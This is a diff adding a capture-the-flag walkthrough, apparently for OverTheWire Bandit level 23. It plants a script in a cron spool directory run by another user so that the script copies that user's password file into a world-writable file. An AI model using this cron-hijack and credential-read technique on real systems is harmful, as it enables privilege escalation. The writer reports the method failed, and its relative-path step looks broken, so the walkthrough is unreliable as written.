@@ -163,7 +163,21 @@ just go cat the output in the tmp folder.
 echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 cat /tmp/output_of_above_command
 
-
-
+level23
+the script will run as bandit24 and it executes all the files in /var/spool/bandit24/foo/ directory and then deletes after a minute
+so we have to write a script to print bandit24's password and save it to a file so that the cron job will execute it
+make a temp directory, write the script, give the script 777 permission and the password file 666 permission and copy the script to the above directory
+mktemp -d
+cd location
+cat > script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > password
+ctrl + c and then:
+chmod 777 script.sh
+touch password
+chmod 666 password
+cp script.sh /var/spool/bandit24/foo/
+cat password
+wait for a minute to print out the password (idk why but i wasn't getting the password but when i executed the script it said no permission, so the script is alright but idk if there is something else that is wrong, also: try changing permissions of the temp directory so that everybody can write to it
 
 
